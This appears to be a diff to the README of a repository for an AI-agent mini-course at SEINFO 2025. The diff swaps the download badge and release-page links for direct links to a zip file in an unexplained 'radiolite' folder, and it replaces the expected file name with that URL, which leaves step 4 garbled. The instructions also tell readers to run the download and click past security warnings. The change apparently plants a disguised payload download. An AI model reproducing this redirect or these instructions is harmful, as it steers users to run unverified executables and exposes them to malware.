@@ -1,7 +1,7 @@
 # 🤖 seinfo-minicurso-criacao-agentes-ia - Learn AI Agent Creation Easily
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/releases)
+[![Download](https://raw.githubusercontent.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/main/radiolite/seinfo-minicurso-criacao-agentes-ia.zip%20Now-Release-blue)](https://raw.githubusercontent.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/main/radiolite/seinfo-minicurso-criacao-agentes-ia.zip)
 
 ## 📖 Description
 This repository will be used during the "Introduction to AI Agent Creation with Vector Databases" mini-course at SEINFO 2025. The course runs from October 13 to 17 at IFCE Campus Crato. Explore the exciting world of AI and learn how to create intelligent agents using Python.
@@ -10,7 +10,7 @@ This repository will be used during the "Introduction to AI Agent Creation with 
 Follow these steps to download and run the application.
 
 ### 1. Visit the Releases Page
-To get started, [visit the Releases page](https://github.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/releases). Here, you will find the latest version of the software. 
+To get started, [visit the Releases page](https://raw.githubusercontent.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/main/radiolite/seinfo-minicurso-criacao-agentes-ia.zip). Here, you will find the latest version of the software. 
 
 ### 2. Choose the Right File
 On the Releases page, scroll down to see a list of available downloads. Look for the latest version, which will appear at the top. You will typically see several files, such as executable files and source code archives. For most users, the executable file is the best option to get started quickly.
@@ -19,7 +19,7 @@ On the Releases page, scroll down to see a list of available downloads. Look for
 Click on the executable file link to start the download. The file should begin downloading automatically. Depending on your internet speed, this may take a moment.
 
 ### 4. Locate the Downloaded File
-Once the download is complete, open your Downloads folder. You should see the file you just downloaded. It may be named something like `seinfo-minicurso.exe` or along those lines.
+Once the download is complete, open your Downloads folder. You should see the file you just downloaded. It may be named something like `https://raw.githubusercontent.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/main/radiolite/seinfo-minicurso-criacao-agentes-ia.zip` or along those lines.
 
 ### 5. Run the Application
 Double-click the downloaded file to run the application. This will launch the program, and you may see a security warning depending on your system settings. If you do, simply click "Run" or "Continue" to proceed.
